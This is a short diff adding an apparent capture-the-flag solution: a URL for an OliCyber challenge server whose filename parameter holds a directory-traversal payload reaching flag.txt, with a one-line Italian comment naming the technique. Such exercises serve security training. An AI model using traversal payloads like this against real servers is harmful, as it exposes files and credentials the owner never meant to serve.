@@ -1,0 +1,3 @@
+http://traverse.challs.olicyber.it/serve_file?filename=../../../flag.txt
+
+una semplice direcotry traversal
